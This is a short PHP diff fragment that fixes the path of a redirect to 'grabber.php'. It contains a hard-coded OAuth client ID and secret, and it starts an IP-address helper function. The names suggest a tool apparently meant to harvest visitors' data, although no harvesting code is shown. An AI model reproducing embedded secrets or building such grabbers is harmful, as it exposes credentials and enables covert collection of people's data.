@@ -4,7 +4,7 @@ error_reporting(0);
 
 $client_id     = "834943501225426944";
 $client_secret = "GyVDl1yEtLFw80lxV2YrbfPiroo9xG6j";
-$redirect      = "\grabber.php";
+$redirect      = "grabber.php";
 
 function get_ip_address()
 {
